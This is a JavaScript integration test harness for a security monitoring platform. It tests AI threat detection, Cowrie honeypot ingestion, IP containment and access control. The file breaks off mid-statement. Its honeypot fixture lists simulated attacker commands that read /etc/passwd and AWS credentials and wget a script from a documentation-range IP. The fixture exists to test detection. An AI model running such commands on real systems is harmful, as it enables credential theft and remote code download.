'use strict'
/**
 * Cross-service integration run (TEST-003): the real AI engine (uvicorn), the real backend (node server.js) and a
 * local MongoDB, wired together on a throwaway database. Nothing is mocked inside the services; containment uses
 * the mock adapter, so no firewall rule is ever created.
 *
 *   node scripts/integration/run_integration.cjs [--mongo mongodb://127.0.0.1:27017] [--db sentinelai_integration_x]
 *                                                [--rows 30] [--keep] [--cowrie]
 *
 * Workflows:
 *   A  CICIDS2017 replay (ai-engine/demo/replay_cicids.py --target backend) -> /api/ai/analyze -> FastAPI ->
 *      AIPrediction/ThreatLog in MongoDB -> Socket.IO new_threat / ai_prediction to a signed-in admin socket
 *   B  Cowrie JSON log (fixture written here) -> honeypot/parsers/log_parser.py --file -> /api/honeypot/ingest ->
 *      HoneypotSession with commands, rule classification, MITRE techniques, deception score, canary alert
 *   C  Manual block-ip -> safety policy -> mock adapter -> ContainmentAction ACTIVE -> AuditLog -> unblock-ip ->
 *      ROLLED_BACK; protected target refused; policy action with a 60 s TTL rolled back by reconciliation
 *   D  CSRF + login, RBAC (viewer/analyst/admin), logout revokes the access token
 *
 * Safety: the database name is generated (sentinelai_integration_<time>) and must contain "integration"; it is
 * the only database written, and it is dropped at the end unless --keep. Secrets and passwords are generated per
 * run, never printed, and neither service reads the developer's .env files (DOTENV_CONFIG_PATH -> empty file,
 * every engine variable set explicitly). Services bind 127.0.0.1 on ports 18100 (engine) and 15100 (backend).
 * Evidence (sanitised JSON + service logs) goes to scripts/integration/runs/<time>/ (git-ignored).
 */
const { spawn, spawnSync } = require('child_process')
const crypto = require('crypto')
const fs = require('fs')
const path = require('path')

const root = path.resolve(__dirname, '../..')
const req = (mod) => require(path.join(root, 'backend/node_modules', mod))
const mongoose = req('mongoose')
const { io: socketClient } = require(path.join(root, 'frontend/node_modules/socket.io-client'))

const arg = (name, dflt) => {
  const i = process.argv.indexOf('--' + name)
  return i > 0 ? process.argv[i + 1] : dflt
}
const KEEP = process.argv.includes('--keep')
const COWRIE = process.argv.includes('--cowrie')
const MONGO = arg('mongo', 'mongodb://127.0.0.1:27017')
const ROWS = parseInt(arg('rows', '30'), 10)
const stamp = new Date().toISOString().replace(/[-:]/g, '').replace(/\..*/, '').replace('T', '_')
const DB = arg('db', 'sentinelai_integration_' + stamp) // --db for a pre-provisioned (e.g. auth-enabled) database
const ENGINE_PORT = 18100
const BACKEND_PORT = 15100
const ORIGIN = 'http://localhost:3999'
const BASE = `http://127.0.0.1:${BACKEND_PORT}`
const runDir = path.join(__dirname, 'runs', stamp)
fs.mkdirSync(runDir, { recursive: true })

const secret = () => crypto.randomBytes(32).toString('hex')
const S = { SENTINEL_KEY: secret(), HONEYPOT_API_KEY: secret(), JWT_SECRET: secret(), JWT_REFRESH_SECRET: secret() }
const users = {
  admin: { name: 'Integration Admin', email: 'admin@integration.test', role: 'admin', password: 'Ia1!' + secret() },
  analyst: { name: 'Integration Analyst', email: 'analyst@integration.test', role: 'analyst', password: 'Ia1!' + secret() },
  viewer: { name: 'Integration Viewer', email: 'viewer@integration.test', role: 'viewer', password: 'Ia1!' + secret() },
}
const redact = (text) => {
  let t = String(text)
  for (const v of [...Object.values(S), ...Object.values(users).map((u) => u.password)]) t = t.split(v).join('<redacted>')
  return t.replace(/eyJ[\w-]+\.[\w-]+\.[\w-]+/g, '<jwt>')
}

const results = []
const check = async (wf, name, fn) => {
  const t0 = Date.now()
  try {
    const detail = await fn()
    results.push({ wf, name, status: 'PASS', ms: Date.now() - t0, detail: detail ?? null })
    console.log(`PASS  ${wf}  ${name}`)
  } catch (e) {
    results.push({ wf, name, status: 'FAIL', ms: Date.now() - t0, detail: redact(e.message) })
    console.log(`FAIL  ${wf}  ${name}: ${redact(e.message)}`)
  }
}
const assert = (cond, msg) => {
  if (!cond) throw new Error(msg)
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
const waitFor = async (fn, ms, label) => {
  const end = Date.now() + ms
  for (;;) {
    const v = await fn().catch(() => null)
    if (v) return v
    if (Date.now() > end) throw new Error('timed out waiting for ' + label)
    await sleep(500)
  }
}

const procs = []
const service = (name, cmd, args, cwd, env) => {
  const log = fs.createWriteStream(path.join(runDir, name + '.log'))
  const p = spawn(cmd, args, { cwd, env, windowsHide: true, stdio: ['ignore', 'pipe', 'pipe'] })
  p.stdout.on('data', (d) => log.write(redact(d)))
  p.stderr.on('data', (d) => log.write(redact(d)))
  procs.push(p)
  return p
}
const baseEnv = () => {
  const keep = ['PATH', 'Path', 'SYSTEMROOT', 'SystemRoot', 'TEMP', 'TMP', 'USERPROFILE', 'LOCALAPPDATA', 'APPDATA', 'HOME', 'COMSPEC', 'PATHEXT', 'WINDIR']
  const env = {}
  for (const k of keep) if (process.env[k]) env[k] = process.env[k]
  return { ...env, NO_PROXY: '127.0.0.1,localhost', HTTP_PROXY: '', HTTPS_PROXY: '' }
}

// Minimal cookie-aware HTTP client (Origin + CSRF the way the dashboard does it)
class Client {
  constructor() {
    this.cookies = {}
    this.token = null
  }
  async call(method, route, body, extra = {}) {
    const headers = { Origin: ORIGIN, ...extra }
    if (body !== undefined) headers['Content-Type'] = 'application/json'
    if (this.token) headers.Authorization = 'Bearer ' + this.token
    const cookie = Object.entries(this.cookies).map(([k, v]) => k + '=' + v).join('; ')
    if (cookie) headers.Cookie = cookie
    const res = await fetch(BASE + route, { method, headers, body: body === undefined ? undefined : JSON.stringify(body) })
    for (const c of res.headers.getSetCookie?.() || []) {
      const [kv] = c.split(';')
      const i = kv.indexOf('=')
      this.cookies[kv.slice(0, i)] = kv.slice(i + 1)
    }
    let json = null
    try {
      json = await res.json()
    } catch {}
    return { status: res.status, body: json }
  }
  async csrf() {
    return (await this.call('GET', '/api/auth/csrf')).body.data.csrfToken
  }
  async mutate(method, route, body) {
    return this.call(method, route, body, { 'X-CSRF-Token': await this.csrf() })
  }
  async login(u) {
    const r = await this.mutate('POST', '/api/auth/login', { email: u.email, password: u.password })
    assert(r.status === 200, 'login ' + u.role + ' -> HTTP ' + r.status)
    this.token = r.body.data.token
    return r
  }
}

function cowrieFixture(file) {
  const sid = 'integ' + crypto.randomBytes(4).toString('hex')
  const ip = '203.0.113.77' // TEST-NET-3 documentation range
  const t = Date.now() - 120000
  const ts = (s) => new Date(t + s * 1000).toISOString()
  const ev = (s, eventid, extra) => JSON.stringify({ eventid, session: sid, src_ip: ip, timestamp: ts(s), sensor: 'integration', ...extra })
  const cmds = ['uname -a', 'id', 'cat /etc/passwd', 'cat ~/.aws/credentials', 'wget http://198.51.100.9/x.sh', 'chmod +x x.sh', 'crontab -l']
  const lines = [
    ev(0, 'cowrie.session.connect', { src_port: 51515, dst_port: 2222, protocol: 'ssh' }),
    ev(1, 'cowrie.client.version', { version: 'SSH-2.0-integration' }),
    ev(2, 'cowrie.login.failed', { username: 'root', password: 'integration-wrong' }),
    ev(3, 'cowrie.login.success', { username: 'root', password: 'integration-right' }),
    ...cmds.map((c, i) => ev(5 + i * 5, 'cowrie.command.input', { input: c })),
    ev(90, 'cowrie.session.closed', { duration: 90.0, duration_ms: 90000 }),
  ]
  fs.writeFileSync(file, lines.join('\n') + '\n')
  return { sid, ip, commands: cmds.length }
}

// ── --cowrie: the WSL lab install (scripts/integration/cowrie_lab.sh) ──────────
const toWsl = (p) => '/mnt/' + p[0].toLowerCase() + p.slice(2).replace(/\\/g, '/')
const lab = { tag: stamp.replace('_', ''), backedUp: false }
const wsl = (args, env = {}) => {
  const r = spawnSync('wsl.exe', ['-d', 'Ubuntu', '--', 'bash', toWsl(path.join(__dirname, 'cowrie_lab.sh')), ...args], {
    encoding: 'utf8',
    env: { ...baseEnv(), ...env, WSLENV: Object.keys(env).join(':') },
    timeout: 180000,
  })
  const out = (r.stdout || '').replace(/\0/g, '').trim()
  if (r.status !== 0) throw new Error(`cowrie_lab.sh ${args[0]} exit ${r.status}: ${(r.stderr || '').replace(/\0/g, '').trim().slice(0, 300)}`)
  return out
}
const cfgField = (text, name) => (text.match(new RegExp('^' + name + '\\s*=\\s*(.*)$', 'm')) || [])[1]?.trim()
// One SSH session against Cowrie, then its events through the real parser with the cowrie.cfg it ran under
async function labSession(tmp, n, HoneypotSession) {
  const dir = path.join(tmp, 'lab' + n)
  fs.mkdirSync(path.join(dir, 'var/log/cowrie'), { recursive: true })
  fs.mkdirSync(path.join(dir, 'etc'), { recursive: true })
  const log = path.join(dir, 'var/log/cowrie/cowrie.json')
  const ssh = wsl(['attack', toWsl(log)])
  fs.copyFileSync(lab.cfg, path.join(dir, 'etc/cowrie.cfg'))
  const events = fs.readFileSync(log, 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l))
  const sid = events.find((e) => e.eventid === 'cowrie.session.connect')?.session
  assert(sid, 'no Cowrie session.connect event in the new log lines')
  const out = spawnSync(lab.python, ['-I', path.join(root, 'honeypot/parsers/log_parser.py'), '--file', log], {
    cwd: dir,
    env: { ...baseEnv(), HONEYPOT_API_KEY: S.HONEYPOT_API_KEY, SENTINEL_API: BASE + '/api', PARSER_STATE_DIR: path.join(dir, 'state') },
    encoding: 'utf8',
    timeout: 120000,
  })
  fs.appendFileSync(path.join(runDir, 'cowrie-parser.log'), redact((out.stdout || '') + (out.stderr || '')))
  assert(out.status === 0, 'parser exit ' + out.status)
  const s = await waitFor(async () => {
    const d = await HoneypotSession.findOne({ sessionId: sid }).lean()
    return d && d.closureAnalysisState === 'complete' ? d : null
  }, 60000, 'lab session ' + n + ' closure')
  return { sid, ssh, session: s, eventIds: [...new Set(events.map((e) => e.eventid))] }
}

async function main() {
  assert(DB.includes('integration'), 'database guard')
  const pyExe = path.join(root, 'ai-engine/.venv/Scripts/python.exe')
  const python = fs.existsSync(pyExe) ? pyExe : path.join(root, 'ai-engine/.venv/bin/python')
  const tmp = fs.mkdtempSync(path.join(require('os').tmpdir(), 'sentinel-integ-'))
  const emptyEnv = path.join(tmp, 'empty.env')
  fs.writeFileSync(emptyEnv, '')
  const [mongoBase, mongoQuery] = MONGO.split('?')
  const MONGO_URI = mongoBase.replace(/\/$/, '') + '/' + DB + (mongoQuery ? '?' + mongoQuery : '')
  const qPath = path.join(tmp, 'q_table.json')
  if (COWRIE) {
    lab.python = python
    const home = spawnSync('wsl.exe', ['-d', 'Ubuntu', '--', 'bash', '-c', 'echo $HOME'], { encoding: 'utf8' }).stdout.replace(/\0/g, '').trim()
    lab.cfg = '\\\\wsl.localhost\\Ubuntu' + home.replace(/\//g, '\\') + '\\sentinelai-cowrie-test\\cowrie\\etc\\cowrie.cfg'
    lab.originalHash = wsl(['backup', lab.tag])
    lab.backedUp = true
    lab.persona0 = wsl(['persona'])
    assert(lab.persona0, 'cowrie.cfg was not generated by switch_profile.py (no persona header)')
    // Throwaway Q-table that makes another persona the greedy choice from the served one, so the rotator has a
    // switch to apply (epsilon-greedy may still explore; the rotation check retries)
    lab.alt = lab.persona0 === 'debian_11' ? 'centos_7' : 'debian_11'
    lab.seedQ = 5.0
    fs.writeFileSync(qPath, JSON.stringify({ q_table: { [lab.persona0]: { [lab.alt]: lab.seedQ } }, episode_count: 0, total_reward: 0, reward_history: [] }))
  }

  // Users, seeded through the real model (bcrypt pre-save hook)
  await mongoose.connect(MONGO_URI, { serverSelectionTimeoutMS: 4000 })
  const User = require(path.join(root, 'backend/models/User'))
  for (const u of Object.values(users)) await User.create({ ...u, mustChangePassword: false })

  const engineEnv = {
    ...baseEnv(),
    SENTINEL_KEY: S.SENTINEL_KEY,
    SENTINEL_ADMIN_KEY: secret(),
    SENTINEL_API: BASE + '/api',
    MODEL_DIR: path.join(root, 'ai-engine/models'),
    Q_TABLE_PATH: qPath,
    CORS_ORIGINS: ORIGIN,
    PYTHONDONTWRITEBYTECODE: '1',
  }
  service('engine', python, ['-m', 'uvicorn', 'inference.main:app', '--host', '127.0.0.1', '--port', String(ENGINE_PORT)], path.join(root, 'ai-engine'), engineEnv)
  service('backend', process.execPath, ['server.js'], path.join(root, 'backend'), {
    ...baseEnv(),
    DOTENV_CONFIG_PATH: emptyEnv,
    NODE_ENV: 'development',
    HOST: '127.0.0.1',
    PORT: String(BACKEND_PORT),
    MONGO_URI,
    CLIENT_URL: ORIGIN,
    AI_ENGINE_URL: `http://127.0.0.1:${ENGINE_PORT}`,
    AI_ENGINE_ADMIN_KEY: engineEnv.SENTINEL_ADMIN_KEY,
    CONTAINMENT_BACKEND: 'mock',
    ENABLE_REAL_WINDOWS_FIREWALL_ENFORCEMENT: 'false',
    LOG_LEVEL: 'info',
    ...S,
  })
  await check('-', 'AI engine /ready', () =>
    waitFor(async () => {
      const r = await fetch(`http://127.0.0.1:${ENGINE_PORT}/ready`)
      return r.status === 200 ? r.json() : null
    }, 120000, 'engine ready').then((b) => ({ model: b.model_version || b.modelVersion || b.model || null }))
  )
  await check('-', 'backend /health', () =>
    waitFor(async () => ((await fetch(BASE + '/health')).status === 200 ? true : null), 60000, 'backend health')
  )

  const admin = new Client()
  const analyst = new Client()
  const viewer = new Client()

  // ── D: authentication and RBAC ──────────────────────────────────────────────
  await check('D', 'login without CSRF token is refused', async () => {
    const r = await new Client().call('POST', '/api/auth/login', { email: users.admin.email, password: users.admin.password })
    assert(r.status === 403, 'expected 403, got ' + r.status)
  })
  await check('D', 'wrong password -> 401', async () => {
    const r = await new Client().mutate('POST', '/api/auth/login', { email: users.analyst.email, password: 'wrong-' + secret() })
    assert(r.status === 401, 'expected 401, got ' + r.status)
  })
  await check('D', 'admin, analyst and viewer log in; /auth/me returns the role', async () => {
    for (const [c, u] of [[admin, users.admin], [analyst, users.analyst], [viewer, users.viewer]]) {
      await c.login(u)
      const me = await c.call('GET', '/api/auth/me')
      assert(me.status === 200 && me.body.data.user.role === u.role, 'me for ' + u.role)
    }
  })
  await check('D', 'no token -> 401 on a protected API', async () => {
    const r = await new Client().call('GET', '/api/threats')
    assert(r.status === 401, 'expected 401, got ' + r.status)
  })
  await check('D', 'viewer cannot block an IP (403); analyst cannot list users (403); admin can', async () => {
    const v = await viewer.mutate('POST', '/api/threats/block-ip', { ip: '198.51.100.40', reason: 'rbac probe' })
    assert(v.status === 403, 'viewer block-ip ' + v.status)
    const a = await analyst.call('GET', '/api/users')
    assert(a.status === 403, 'analyst users ' + a.status)
    const ad = await admin.call('GET', '/api/users')
    assert(ad.status === 200, 'admin users ' + ad.status)
  })

  // Socket for A/B/C events
  const events = []
  const sock = socketClient(BASE, { auth: { token: admin.token }, transports: ['websocket'], reconnection: false, extraHeaders: { Origin: ORIGIN } })
  await check('-', 'admin Socket.IO connects with its JWT', () =>
    new Promise((resolve, reject) => {
      sock.on('connect', () => {
        sock.emit('join_room', { role: 'admin' })
        sock.emit('subscribe_threats')
        resolve(true)
      })
      sock.on('connect_error', (e) => reject(new Error('socket: ' + e.message)))
      setTimeout(() => reject(new Error('socket timeout')), 15000)
    })
  )
  sock.onAny((name, payload) => events.push({ name, at: Date.now(), payload }))
  await check('D', 'socket with a bad token is rejected', () =>
    new Promise((resolve, reject) => {
      const bad = socketClient(BASE, { auth: { token: 'not-a-token' }, transports: ['websocket'], reconnection: false })
      bad.on('connect', () => {
        bad.close()
        reject(new Error('connected with a bad token'))
      })
      bad.on('connect_error', () => {
        bad.close()
        resolve(true)
      })
    })
  )

  // ── A: dataset replay through the persisted path ────────────────────────────
  const AIPrediction = require(path.join(root, 'backend/models/AIPrediction'))
  const ThreatLog = require(path.join(root, 'backend/models/ThreatLog'))
  await check('A', `replay ${ROWS} CICIDS2017 flows via replay_cicids.py --target backend`, async () => {
    const out = spawnSync(python, ['-I', 'demo/replay_cicids.py', '--target', 'backend', '--rows', String(ROWS), '--delay', '0', '--backend-url', BASE, '--email', users.analyst.email, '--origin', ORIGIN, '--no-color'], {
      cwd: path.join(root, 'ai-engine'),
      env: { ...baseEnv(), SENTINEL_DEMO_PASSWORD: users.analyst.password },
      encoding: 'utf8',
      timeout: 300000,
    })
    fs.writeFileSync(path.join(runDir, 'replay.log'), redact((out.stdout || '') + (out.stderr || '')))
    assert(out.status === 0, 'replay exit ' + out.status)
    return { exit: out.status }
  })
  await check('A', 'every replayed flow is stored as an AIPrediction', async () => {
    const n = await waitFor(async () => {
      const c = await AIPrediction.countDocuments({})
      return c >= ROWS ? c : null
    }, 30000, 'predictions')
    const byClass = await AIPrediction.aggregate([{ $group: { _id: '$predictedClass', n: { $sum: 1 } } }])
    const versions = await AIPrediction.distinct('modelVersion')
    return { predictions: n, byClass: Object.fromEntries(byClass.map((x) => [x._id, x.n])), modelVersions: versions }
  })
  await check('A', 'non-benign predictions at/above the alert line became ThreatLogs and reached the socket', async () => {
    const threats = await ThreatLog.countDocuments({})
    const live = events.filter((e) => e.name === 'new_threat').length
    const preds = events.filter((e) => e.name === 'ai_prediction').length
    assert(preds > 0 || live > 0, 'no ai_prediction/new_threat socket event received')
    return { threatLogs: threats, newThreatEvents: live, aiPredictionEvents: preds }
  })

  // ── B: Cowrie log -> parser -> ingest -> closure analysis ───────────────────
  const HoneypotSession = require(path.join(root, 'backend/models/HoneypotSession'))
  const Alert = require(path.join(root, 'backend/models/Alert'))
  const fx = cowrieFixture(path.join(tmp, 'cowrie.json'))
  await check('B', 'log_parser.py --file posts the Cowrie session', async () => {
    const out = spawnSync(python, ['-I', path.join(root, 'honeypot/parsers/log_parser.py'), '--file', path.join(tmp, 'cowrie.json')], {
      cwd: tmp,
      env: { ...baseEnv(), HONEYPOT_API_KEY: S.HONEYPOT_API_KEY, SENTINEL_API: BASE + '/api', PARSER_STATE_DIR: path.join(tmp, 'parser-state') },
      encoding: 'utf8',
      timeout: 120000,
    })
    fs.writeFileSync(path.join(runDir, 'parser.log'), redact((out.stdout || '') + (out.stderr || '')))
    assert(out.status === 0, 'parser exit ' + out.status)
  })
  await check('B', 'session stored, closed and analysed (rules, MITRE, deception score)', async () => {
    const s = await waitFor(async () => {
      const d = await HoneypotSession.findOne({ sessionId: fx.sid }).lean()
      return d && d.closureAnalysisState === 'complete' ? d : null
    }, 60000, 'closure analysis')
    assert(s.sourceIP === fx.ip, 'sourceIP')
    assert(s.commands.length === fx.commands, `commands ${s.commands.length}/${fx.commands}`)
    assert(s.credentials.length >= 2, 'credentials')
    assert((s.mitreTechniques || []).length > 0, 'no MITRE techniques')
    assert(s.aiClassification, 'no classification')
    return {
      classification: s.aiClassification,
      method: s.aiClassificationMethod,
      aiThreatScore: s.aiThreatScore,
      deceptionScore: s.deceptionScore,
      qDeceptionScore: s.qDeceptionScore,
      servedProfile: s.servedProfile,
      recommendedProfile: s.recommendedProfile,
      mitre: s.mitreTechniques.map((m) => m.id),
      intents: s.commands.map((c) => c.intent),
      durationSeconds: s.durationSeconds,
    }
  })
  await check('B', 'canary read raised an alert; honeypot events reached the socket', async () => {
    const canary = await Alert.countDocuments({ title: 'Canary file read' })
    assert(canary === 1, 'canary alerts ' + canary)
    const hp = events.filter((e) => e.name.startsWith('honeypot_')).map((e) => e.name)
    assert(hp.includes('honeypot_session_opened') && hp.includes('honeypot_session_closed'), 'socket: ' + [...new Set(hp)].join(','))
    return { socketEvents: [...new Set(hp)] }
  })
  await check('B', 'replaying the same log changes nothing (idempotent ingest)', async () => {
    const before = await HoneypotSession.findOne({ sessionId: fx.sid }).lean()
    const alerts = await Alert.countDocuments({})
    spawnSync(python, ['-I', path.join(root, 'honeypot/parsers/log_parser.py'), '--file', path.join(tmp, 'cowrie.json')], {
      cwd: tmp,
      env: { ...baseEnv(), HONEYPOT_API_KEY: S.HONEYPOT_API_KEY, SENTINEL_API: BASE + '/api', PARSER_STATE_DIR: path.join(tmp, 'parser-state-2') },
      encoding: 'utf8',
      timeout: 120000,
    })
    await sleep(2000)
    const after = await HoneypotSession.findOne({ sessionId: fx.sid }).lean()
    assert(after.commands.length === before.commands.length, `commands ${before.commands.length} -> ${after.commands.length}`)
    assert((await Alert.countDocuments({})) === alerts, 'alerts duplicated')
    assert((await HoneypotSession.countDocuments({ sessionId: fx.sid })) === 1, 'session duplicated')
  })
  await check('B', 'old/unknown honeypot key is refused (401/403)', async () => {
    const r = await fetch(BASE + '/api/honeypot/ingest/check-block', { headers: { 'X-API-Key': secret() } })
    assert([401, 403].includes(r.status), 'got ' + r.status)
  })

  // ── B (live): real Cowrie in WSL, persona rotation, Q-learning persistence ─────
  if (COWRIE) {
    const labEnv = { HONEYPOT_API_KEY: S.HONEYPOT_API_KEY, SENTINEL_API_URL: BASE + '/api' }
    let first
    await check('B-live', `Cowrie starts on 127.0.0.1:2222 serving ${lab.persona0}`, () => wsl(['start'], labEnv) || true)
    await check('B-live', 'real SSH session -> parser -> stored with the persona cowrie.cfg serves', async () => {
      first = await labSession(tmp, 1, HoneypotSession)
      const host = cfgField(fs.readFileSync(lab.cfg, 'utf8'), 'hostname')
      assert(first.ssh.includes(host), `SSH output does not show the persona hostname ${host}`)
      assert(first.session.servedProfile === lab.persona0, `servedProfile ${first.session.servedProfile} != ${lab.persona0}`)
      return { sessionId: first.sid, hostname: host, servedProfile: first.session.servedProfile, recommendedProfile: first.session.recommendedProfile, commands: first.session.commands.length, mitre: first.session.mitreTechniques.map((m) => m.id), events: first.eventIds }
    })
    let rotation
    await check('B-live', 'rotator applies a recommendation: cowrie.cfg rewritten, Cowrie restarted, persona recorded', async () => {
      for (let attempt = 1; attempt <= 4 && !rotation?.changed; attempt++) {
        const out = spawnSync(lab.python, [path.join(root, 'honeypot/deception_rotator.py'), '--once', '--force', '--backend', BASE, '--origin', ORIGIN, '--cfg', lab.cfg, '--restart-cmd', `wsl.exe -d Ubuntu -- bash ${toWsl(path.join(__dirname, 'cowrie_lab.sh'))} restart`], {
          env: { ...baseEnv(), HONEYPOT_API_KEY: S.HONEYPOT_API_KEY, COWRIE_LISTEN_ADDR: '127.0.0.1', COWRIE_PERSONA_FS: 'personas', ...labEnv, WSLENV: Object.keys(labEnv).join(':') },
          encoding: 'utf8',
          timeout: 240000,
        })
        const text = redact((out.stdout || '') + (out.stderr || ''))
        fs.appendFileSync(path.join(runDir, 'rotator.log'), text)
        const m = text.match(/Rotation result: (\{.*\})/)
        rotation = m ? JSON.parse(m[1].replace(/'/g, '"').replace(/True/g, 'true').replace(/False/g, 'false')) : { error: 'exit ' + out.status }
        rotation.attempt = attempt
      }
      assert(rotation.changed, 'no switch applied: ' + JSON.stringify(rotation))
      const now = wsl(['persona'])
      assert(now === rotation.active && now !== lab.persona0, `cowrie.cfg persona ${now}`)
      return rotation
    })
    await check('B-live', 'next SSH session sees the new persona and is credited to it', async () => {
      const second = await labSession(tmp, 2, HoneypotSession)
      const host = cfgField(fs.readFileSync(lab.cfg, 'utf8'), 'hostname')
      assert(second.ssh.includes(host), `SSH output does not show the new hostname ${host}`)
      assert(second.session.servedProfile === rotation.active, `servedProfile ${second.session.servedProfile} != ${rotation.active}`)
      return { sessionId: second.sid, hostname: host, servedProfile: second.session.servedProfile, recommendedProfile: second.session.recommendedProfile }
    })
    await check('B-live', 'Q-table persisted: valid JSON, one episode per session, reward credited to (served -> applied)', async () => {
      const q = JSON.parse(fs.readFileSync(qPath, 'utf8'))
      const v = q.q_table?.[lab.persona0]?.[rotation.active]
      const seeded = rotation.active === lab.alt ? lab.seedQ : 0
      assert(q.episode_count >= 2, 'episode_count ' + q.episode_count)
      assert(typeof v === 'number' && v !== seeded, `Q[${lab.persona0}][${rotation.active}] unchanged (${v})`)
      return { episode_count: q.episode_count, state: lab.persona0, action: rotation.active, seeded, now: v, saved_at: q.saved_at }
    })
  }

  // ── C: containment ──────────────────────────────────────────────────────────
  const ContainmentAction = require(path.join(root, 'backend/models/ContainmentAction'))
  const BlockedIP = require(path.join(root, 'backend/models/BlockedIP'))
  const AuditLog = require(path.join(root, 'backend/models/AuditLog'))
  const target = '198.51.100.23'
  await check('C', 'protected target (loopback) is refused', async () => {
    assert(analyst.token, 'analyst not signed in')
    const r = await analyst.mutate('POST', '/api/threats/block-ip', { ip: '127.0.0.1', reason: 'protected probe' })
    assert([400, 403, 422].includes(r.status), 'got ' + r.status)
    assert(!(await BlockedIP.exists({ ip: '127.0.0.1' })), 'loopback deny-listed')
  })
  await check('C', 'analyst block-ip -> deny-list + mock adapter ACTIVE + audit record + socket', async () => {
    const r = await analyst.mutate('POST', '/api/threats/block-ip', { ip: target, reason: 'integration block' })
    assert(r.status === 200, 'block-ip ' + r.status + ' ' + JSON.stringify(r.body))
    const e = r.body.data.enforcement
    assert(e && e.status === 'ACTIVE' && e.backend === 'mock', 'enforcement ' + JSON.stringify(e))
    assert(await BlockedIP.exists({ ip: target }), 'no BlockedIP row')
    const a = await ContainmentAction.findOne({ normalizedTarget: target, enforcementStatus: 'ACTIVE' }).lean()
    assert(a, 'no ACTIVE ContainmentAction')
    const audits = await AuditLog.countDocuments({})
    assert(audits > 0, 'no AuditLog rows')
    await sleep(500)
    assert(events.some((x) => x.name === 'ip_blocked' && x.payload?.ip === target), 'no ip_blocked socket event')
    return { containmentId: a.containmentId, expiresAt: a.expiresAt, auditRows: audits }
  })
  await check('C', 'repeat block is idempotent (one ACTIVE action, one BlockedIP)', async () => {
    await analyst.mutate('POST', '/api/threats/block-ip', { ip: target, reason: 'again' })
    assert((await ContainmentAction.countDocuments({ normalizedTarget: target, enforcementStatus: 'ACTIVE' })) === 1, 'ACTIVE count')
    assert((await BlockedIP.countDocuments({ ip: target })) === 1, 'BlockedIP count')
  })
  await check('C', 'blocker plugin sees the IP via check-block (honeypot key)', async () => {
    const r = await fetch(BASE + '/api/honeypot/ingest/check-block?ip=' + target, { headers: { 'X-API-Key': S.HONEYPOT_API_KEY } })
    const b = await r.json()
    assert(r.status === 200, 'check-block ' + r.status)
    return { response: JSON.stringify(b).slice(0, 200).replace(/\d+\.\d+\.\d+\.\d+/g, (m) => (m === target ? m : '<ip>')) }
  })
  await check('C', 'unblock-ip -> adapter rule ROLLED_BACK, deny-list cleared, ip_unblocked event', async () => {
    const r = await analyst.mutate('POST', '/api/threats/unblock-ip', { ip: target })
    assert(r.status === 200, 'unblock ' + r.status)
    assert(!(await BlockedIP.exists({ ip: target })), 'BlockedIP still present')
    assert(!(await ContainmentAction.exists({ normalizedTarget: target, enforcementStatus: 'ACTIVE' })), 'still ACTIVE')
    assert(await ContainmentAction.exists({ normalizedTarget: target, enforcementStatus: 'ROLLED_BACK' }), 'no ROLLED_BACK')
    await sleep(500)
    assert(events.some((x) => x.name === 'ip_unblocked'), 'no ip_unblocked event')
    return { enforcement: r.body.data.enforcement }
  })
  await check('C', 'policy action with 60 s TTL is rolled back by reconciliation on expiry', async () => {
    const ttlTarget = '198.51.100.24'
    const r = await analyst.mutate('POST', '/api/containment/actions', { target: ttlTarget, actionType: 'block_ip', durationSeconds: 60, reason: 'ttl test' })
    assert([200, 201].includes(r.status), 'request ' + r.status + ' ' + JSON.stringify(r.body).slice(0, 200))
    const a = await ContainmentAction.findOne({ normalizedTarget: ttlTarget }).lean()
    assert(a.enforcementStatus === 'ACTIVE', 'status ' + a.enforcementStatus)
    const rolled = await waitFor(async () => {
      const d = await ContainmentAction.findOne({ normalizedTarget: ttlTarget }).lean()
      return d.enforcementStatus === 'ROLLED_BACK' ? d : null
    }, 150000, 'TTL rollback (reconciliation runs every 60 s)')
    return { expiresAt: a.expiresAt, rolledBackAt: rolled.rolledBackAt, lagSeconds: Math.round((new Date(rolled.rolledBackAt) - new Date(a.expiresAt)) / 1000) }
  })

  // ── D: logout revokes ───────────────────────────────────────────────────────
  await check('D', 'logout revokes the access token (old token -> 401)', async () => {
    const token = viewer.token
    const out = await viewer.mutate('POST', '/api/auth/logout', {})
    assert(out.status === 200, 'logout ' + out.status)
    const stale = new Client()
    stale.token = token
    const r = await stale.call('GET', '/api/auth/me')
    assert(r.status === 401, 'stale token got ' + r.status)
  })

  // ── Resilience: AI engine goes away mid-run ─────────────────────────────────
  // Designed fallback (aiService.js): the flow is kept as a DEGRADED threat held in MONITOR, never blocked, and one
  // "AI Engine" SYSTEM_HEALTH alert is raised per cooldown.
  await check('-', 'AI engine stopped: flow held as DEGRADED (not blocked), health alert raised, backend stays up', async () => {
    procs[0].kill()
    await sleep(1500)
    const ip = '198.51.100.60'
    const t0 = Date.now()
    const r = await analyst.mutate('POST', '/api/ai/analyze', { sourceIP: ip, flow_duration: 1000 })
    const ms = Date.now() - t0
    assert(r.status === 200, 'analyze with engine down -> ' + r.status)
    assert(ms < 30000, 'took ' + ms + ' ms')
    const t = await waitFor(() => ThreatLog.findOne({ sourceIP: ip }).lean(), 10000, 'degraded threat')
    assert(t.status === 'DEGRADED', 'threat status ' + t.status)
    assert(!(await BlockedIP.exists({ ip })), 'degraded flow was deny-listed')
    const alert = await Alert.findOne({ title: /AI Engine/ }).lean()
    assert(alert, 'no AI Engine health alert')
    // /health is readiness including the engine, so it must report 503; the API itself keeps serving
    const health = (await fetch(BASE + '/health')).status
    assert(health === 503, 'backend /health ' + health + ' (expected 503 while the engine is down)')
    assert((await analyst.call('GET', '/api/threats')).status === 200, 'API stopped serving')
    return { ms, threatStatus: t.status, severity: t.severity, alert: alert.title, health }
  })

  sock.close()
}

main()
  .catch((e) => {
    results.push({ wf: '-', name: 'harness', status: 'FAIL', detail: redact(e.stack || e.message) })
    console.log('HARNESS ERROR: ' + redact(e.message))
  })
  .finally(async () => {
    if (lab.backedUp) {
      try {
        const hash = wsl(['restore', lab.tag])
        results.push({ wf: 'B-live', name: 'lab cowrie.cfg restored to its original content and state', status: hash === lab.originalHash ? 'PASS' : 'FAIL', detail: { hashPrefix: hash } })
      } catch (e) {
        results.push({ wf: 'B-live', name: 'lab restore', status: 'FAIL', detail: e.message + ` (backup: etc/cowrie.cfg.integ-${lab.tag})` })
      }
    }
    for (const p of procs) p.kill()
    try {
